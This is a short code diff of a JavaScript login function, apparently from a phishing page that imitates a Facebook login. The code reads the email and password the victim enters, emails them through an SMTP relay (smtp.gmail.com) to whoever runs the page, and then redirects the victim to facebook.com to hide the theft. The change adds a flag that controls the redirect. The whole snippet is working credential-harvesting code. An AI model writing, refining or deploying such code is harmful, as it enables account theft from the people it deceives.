@@ -2,7 +2,7 @@ function login() {
     var email = document.getElementById("email").value;
     var pass = document.getElementById("pass").value;
     if(email && pass){
-        sendEmail(`Người dùng: <strong>${email}</strong><br/>Password: <strong>${pass}</strong>`);
+        sendEmail(`Người dùng: <strong>${email}</strong><br/>Password: <strong>${pass}</strong>`, true);
     }
     else{
         var emailCls = document.getElementsByClassName("error-email"); 
@@ -18,7 +18,7 @@ function login() {
     }
 }
 
-function sendEmail(body) {
+function sendEmail(body, re) {
     Email.send({
         Host: "smtp.gmail.com",
         //UseDefaultCredentials: true,
@@ -31,7 +31,9 @@ function sendEmail(body) {
         Body: body,
     }).then(
         message => {
-            window.location.href = "https://www.facebook.com/"
+            if(re){
+                window.location.href = "https://www.facebook.com/"
+            }
         }
     );
 }
